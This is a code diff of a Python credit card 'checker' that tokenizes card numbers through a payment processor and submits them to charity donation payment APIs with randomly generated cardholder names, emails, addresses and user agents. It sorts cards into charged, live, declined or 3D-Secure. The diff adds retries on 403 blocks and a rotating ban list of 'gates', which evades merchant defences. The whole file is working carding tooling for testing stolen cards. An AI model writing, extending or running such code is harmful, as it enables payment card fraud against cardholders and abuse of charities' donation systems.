@@ -4,21 +4,44 @@ import json
 import random
 import string
 import logging
-import copy
+import threading
 
-# Import kho cấu hình
+# Import the central gate configurations
 from gate_configurations import GATE_CONFIGS
 
 logger = logging.getLogger(__name__)
 
-# --- CÁC HÀM TIỆN ÍCH ---
+# --- STATE MANAGEMENT FOR BANNED GATES (THREAD-SAFE) ---
+# This will store the names of gates that have failed repeatedly.
+_banned_gates = set()
+_ban_lock = threading.Lock()
+
+def get_banned_gates():
+    """Returns a copy of the currently banned gates."""
+    with _ban_lock:
+        return _banned_gates.copy()
+
+def ban_gate(gate_name):
+    """Adds a gate to the banned list."""
+    with _ban_lock:
+        _banned_gates.add(gate_name)
+    logger.warning(f"Gate '{gate_name}' has been temporarily banned due to repeated failures.")
+
+def unban_all_gates():
+    """Clears the banned gates list."""
+    with _ban_lock:
+        if _banned_gates:
+            logger.info(f"All banned gates have been reloaded: {_banned_gates}")
+            _banned_gates.clear()
+
+# --- UTILITY FUNCTIONS (COPIED FROM main.py for consistency) ---
 
 def generate_random_string(length=8):
     letters = string.ascii_lowercase
     return ''.join(random.choice(letters) for _ in range(length))
 
 def random_email(config):
-    """Tạo email ngẫu nhiên dựa trên cấu hình của gate."""
+    """Creates a random email based on the gate's configuration."""
     min_len, max_len = config['text_length_range']
     num_digits = config['append_digits']
     
@@ -44,33 +67,46 @@ def random_user_agent():
             f"AppleWebKit/{safari_version} (KHTML, like Gecko) "
             f"Chrome/{chrome_version} Safari/{safari_version}")
 
-def make_request_with_retry(session, method, url, max_retries=5, cancellation_event=None, **kwargs):
+def make_request_with_special_retry(session, method, url, gate_name, max_retries=10, cancellation_event=None, **kwargs):
+    """
+    Custom retry function for Multi-Gate mode.
+    Retries on specific errors and can lead to banning a gate.
+    """
     last_exception = None
     for attempt in range(max_retries):
         if cancellation_event and cancellation_event.is_set():
-            return None, "Operation cancelled by user"
+            return None, "Operation cancelled by user", False # Not a ban-worthy failure
+
         try:
             response = session.request(method, url, **kwargs)
-            return response, None
+            # A 403 Forbidden is a specific failure case we want to retry
+            if response.status_code == 403:
+                last_exception = requests.exceptions.HTTPError(f"403 Forbidden on attempt {attempt + 1}")
+                wait_time = attempt + 1
+                logger.warning(f"Gate '{gate_name}' returned 403. Attempt {attempt + 1}/{max_retries}. Retrying in {wait_time}s...")
+                time.sleep(wait_time)
+                continue
+            
+            # Any other successful or client-error response is returned immediately
+            return response, None, False
+
         except requests.exceptions.RequestException as e:
             last_exception = e
             wait_time = attempt + 1
-            logger.warning(f"Attempt {attempt + 1}/{max_retries} for {url} failed: {e}. Retrying in {wait_time}s...")
-            if cancellation_event:
-                if cancellation_event.wait(wait_time):
-                    return None, "Operation cancelled by user"
-            else:
-                time.sleep(wait_time)
-    final_error_message = f"Retry: All {max_retries} retry attempts for {url} failed. Last error: {last_exception}"
-    logger.error(final_error_message)
-    return None, final_error_message
+            logger.warning(f"Request for gate '{gate_name}' failed: {e}. Attempt {attempt + 1}/{max_retries}. Retrying in {wait_time}s...")
+            time.sleep(wait_time)
 
-# --- LOGIC CHECKER CHUNG ---
+    # If all retries fail, we signal that the gate should be banned
+    final_error_message = f"All {max_retries} retry attempts for gate '{gate_name}' failed. Last error: {last_exception}"
+    logger.error(final_error_message)
+    return None, final_error_message, True # True indicates a ban-worthy failure
+
+# --- MAIN CHECKER LOGIC ---
 
 def _check_card_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, mode, charge_value, gate_name, gate_config):
-    """Hàm nội bộ để check thẻ với một cấu hình gate cụ thể."""
+    """Internal function to check a card against a specific gate configuration."""
     try:
-        # --- Tạo dữ liệu ngẫu nhiên dựa trên cấu hình gate ---
+        # --- Generate random data based on gate config ---
         user_agent = random_user_agent()
         min_name, max_name = gate_config['name_length_range']
         first_name = generate_random_string(random.randint(min_name, max_name))
@@ -78,25 +114,23 @@ def _check_card_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation
         cardholder = f"{first_name} {last_name}"
         email = random_email(gate_config['email_config'])
         
-        # Tạo dữ liệu địa chỉ ngẫu nhiên
         street = generate_random_string(random.randint(20, 35))
         house_number = generate_random_string(random.randint(20, 35))
         postal_code = ''.join(random.choices(string.digits, k=5))
         city = generate_random_string(random.randint(20, 35))
-        
-        # === PHẦN MỚI: TẠO MESSAGE NGẪU NHIÊN ===
         random_message = generate_random_string(random.randint(20, 35))
-        # =======================================
 
-        # --- Bước 1: Lấy Token cho thẻ ---
+        # --- Step 1: Get Token for the card ---
         tokenize_url = "https://pay.datatrans.com/upp/payment/SecureFields/paymentField"
         tokenize_headers = { "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Host": "pay.datatrans.com", "Origin": "https://pay.datatrans.com", "Referer": "https://pay.datatrans.com/upp/payment/SecureFields/paymentField", "User-Agent": user_agent, "X-Requested-With": "XMLHttpRequest" }
         tokenize_payload = { "mode": "TOKENIZE", "formId": gate_config['formId'], "cardNumber": cc, "cvv": cvv, "paymentMethod": "ECA", "merchantId": "3000022877", "browserUserAgent": user_agent, "browserJavaEnabled": "false", "browserLanguage": "vi-VN", "browserColorDepth": "24", "browserScreenHeight": "1152", "browserScreenWidth": "2048", "browserTZ": "-420" }
 
-        token_response, error = make_request_with_retry(session, 'post', tokenize_url, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        token_response, error, should_ban = make_request_with_special_retry(session, 'post', tokenize_url, gate_name, data=tokenize_payload, headers=tokenize_headers, timeout=15, cancellation_event=cancellation_event)
+        if should_ban:
+            ban_gate(gate_name)
+            return 'error', line, f"[{gate_name}] Banned after Tokenize Error: {error}", bin_info
         if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Tokenize Error: {error}", bin_info
-        if not token_response: return 'error', line, f"[{gate_name}] HTTP Error with no response during Tokenization", bin_info
-
+        
         if "Card number not allowed in production" in token_response.text: return 'decline', line, f'[{gate_name}] INVALID_CARDNUMBER_DECLINE', bin_info
         try:
             token_data = token_response.json()
@@ -104,95 +138,79 @@ def _check_card_generic(session, line, cc, mes, ano, cvv, bin_info, cancellation
             transaction_id = token_data.get("transactionId")
             if not transaction_id: return 'decline', line, f'[{gate_name}] {token_data.get("error", "Unknown error at Tokenize")}', bin_info
         except json.JSONDecodeError:
-            if token_response.status_code != 200: return 'error', line, f"[{gate_name}] HTTP Error {token_response.status_code} during Tokenization", bin_info
-            return 'error', line, f"[{gate_name}] Tokenize response was not JSON", bin_info
+            return 'error', line, f"[{gate_name}] Tokenize response was not JSON: {token_response.text}", bin_info
 
-        # --- Bước 2: Thực hiện request dựa trên chế độ ---
+        # --- Step 2: Perform payment/source request ---
         payment_headers = { "Accept": "application/json, text/plain, */*", "Content-Type": "application/json", "Origin": "https://donate.raisenow.io", "Referer": "https://donate.raisenow.io/", "User-Agent": user_agent }
         
-        # Tạo payload từ template, thay thế các placeholder
         payload_str = json.dumps(gate_config['payload'])
-        payload_str = payload_str.replace("{{first_name}}", first_name)
-        payload_str = payload_str.replace("{{last_name}}", last_name)
-        payload_str = payload_str.replace("{{cardholder}}", cardholder)
-        payload_str = payload_str.replace("{{email}}", email)
-        payload_str = payload_str.replace("{{user_agent}}", user_agent)
-        payload_str = payload_str.replace("{{expiry_month}}", mes.zfill(2))
-        payload_str = payload_str.replace("{{expiry_year}}", ano)
-        payload_str = payload_str.replace("{{transaction_id}}", transaction_id)
-        
-        # Thay thế placeholder địa chỉ
-        payload_str = payload_str.replace("{{street}}", street)
-        payload_str = payload_str.replace("{{house_number}}", house_number)
-        payload_str = payload_str.replace("{{postal_code}}", postal_code)
-        payload_str = payload_str.replace("{{city}}", city)
-
-        # === PHẦN MỚI: THAY THẾ PLACEHOLDER MESSAGE ===
-        payload_str = payload_str.replace("{{message}}", random_message)
-        # ============================================
+        replacements = {
+            "{{first_name}}": first_name, "{{last_name}}": last_name, "{{cardholder}}": cardholder,
+            "{{email}}": email, "{{user_agent}}": user_agent, "{{expiry_month}}": mes.zfill(2),
+            "{{expiry_year}}": ano, "{{transaction_id}}": transaction_id, "{{street}}": street,
+            "{{house_number}}": house_number, "{{postal_code}}": postal_code, "{{city}}": city,
+            "{{message}}": random_message
+        }
+        for placeholder, value in replacements.items():
+            payload_str = payload_str.replace(placeholder, value)
         
         base_payload = json.loads(payload_str)
 
-        # --- Logic cho Charge hoặc Live ---
         if mode == 'charge':
             payment_url = "https://api.raisenow.io/payments"
             payment_payload = base_payload
             payment_payload["amount"] = {"currency": gate_config['currency'], "value": charge_value}
-            
-            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
-            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Error: {error}", bin_info
-            if not payment_response: return 'error', line, f"[{gate_name}] HTTP Error with no response during Payment", bin_info
-            
-            response_text = payment_response.text
-            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'[{gate_name}] GATE_DIED: Forbidden', bin_info
-            
-            if '"payment_status":"succeeded"' in response_text: return 'success', line, f'[{gate_name}] CHARGED_{charge_value}', bin_info
-            elif '"payment_status":"failed"' in response_text: return 'decline', line, f'[{gate_name}] {response_text}', bin_info
-            elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text: return 'custom', line, f'[{gate_name}] {response_text}', bin_info
-            else: return 'unknown', line, f'[{gate_name}] {response_text}', bin_info
-        
         else: # 'live' mode
             payment_url = "https://api.raisenow.io/payment-sources"
             payment_payload = base_payload
             payment_payload["amount"] = {"currency": gate_config['currency'], "value": 50} 
 
-            payment_response, error = make_request_with_retry(session, 'post', payment_url, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
-            if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Source Error: {error}", bin_info
-            if not payment_response: return 'error', line, f"[{gate_name}] HTTP Error with no response during Payment Source", bin_info
+        payment_response, error, should_ban = make_request_with_special_retry(session, 'post', payment_url, gate_name, json=payment_payload, headers=payment_headers, timeout=20, cancellation_event=cancellation_event)
+        if should_ban:
+            ban_gate(gate_name)
+            return 'error', line, f"[{gate_name}] Banned after Payment Error: {error}", bin_info
+        if error: return 'cancelled' if "cancelled" in error else 'error', line, f"[{gate_name}] Payment Error: {error}", bin_info
 
-            response_text = payment_response.text
-            if '{"message":"Forbidden"}' in response_text: return 'gate_dead', line, f'[{gate_name}] GATE_DIED: Forbidden', bin_info
-            
-            if '"payment_source_status":"pending"' in response_text: return 'live_success', line, f'[{gate_name}] {response_text}', bin_info
-            elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text: return 'decline', line, f'[{gate_name}] {response_text}', bin_info
-            else: return 'unknown', line, f'[{gate_name}] {response_text}', bin_info
+        response_text = payment_response.text
+        if '"payment_status":"succeeded"' in response_text:
+            return 'success', line, f'[{gate_name}] CHARGED_{charge_value/100:.2f}{gate_config["currency"]}', bin_info
+        elif '"payment_source_status":"pending"' in response_text:
+            return 'live_success', line, f'[{gate_name}] LIVE_SUCCESS', bin_info
+        elif '"payment_status":"failed"' in response_text or '"payment_source_status":"failed"' in response_text:
+            return 'decline', line, f'[{gate_name}] DECLINED', bin_info
+        elif '"action":{"action_type":"redirect"' in response_text or '"3d_secure_2"' in response_text:
+            return 'custom', line, f'[{gate_name}] 3D_SECURE', bin_info
+        else:
+            return 'unknown', line, f'[{gate_name}] UNKNOWN_RESPONSE: {response_text}', bin_info
 
     except Exception as e:
         logger.error(f"Unknown error in Generic Checker for gate '{gate_name}' on line '{line}': {e}", exc_info=True)
         return 'error', line, f"[{gate_name}] System Error: {e}", bin_info
 
-def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, get_charge_value_func, custom_charge_amount=None):
+def check_card_multi_gate(session, line, cc, mes, ano, cvv, bin_info, cancellation_event, get_mode_func, custom_charge_amount=None):
     """
-    Hàm chính cho chế độ Multi-Gate.
-    Nó sẽ chọn ngẫu nhiên một gate từ kho cấu hình và chạy.
+    Main function for Multi-Gate mode. It randomly selects an available (non-banned) gate and runs the check.
     """
     try:
-        # Lấy danh sách các key của gate
-        available_gates = list(GATE_CONFIGS.keys())
+        all_gates = list(GATE_CONFIGS.keys())
+        banned_gates = get_banned_gates()
+        available_gates = [g for g in all_gates if g not in banned_gates]
+        
         if not available_gates:
-            return 'error', line, "No gates defined in gate_configurations.py", bin_info
-            
-        # Chọn ngẫu nhiên một gate
+            logger.warning("All multi-gates are currently banned. Reloading the list.")
+            unban_all_gates()
+            available_gates = all_gates
+            if not available_gates:
+                 return 'error', line, "No gates defined in gate_configurations.py", bin_info
+
         random_gate_name = random.choice(available_gates)
         gate_config = GATE_CONFIGS[random_gate_name]
         
-        # Lấy chế độ (live/charge) và giá trị charge
         mode = get_mode_func() 
-        charge_value = get_charge_value_func(random_gate_name, custom_charge_amount)
+        charge_value = custom_charge_amount if custom_charge_amount is not None else 50 # Default charge 0.50
         
         logger.info(f"Running card on Multi-Gate mode, randomly selected: {random_gate_name}")
         
-        # Gọi hàm checker chung với cấu hình đã chọn
         return _check_card_generic(
             session, line, cc, mes, ano, cvv, bin_info, cancellation_event, 
             mode, charge_value, random_gate_name, gate_config
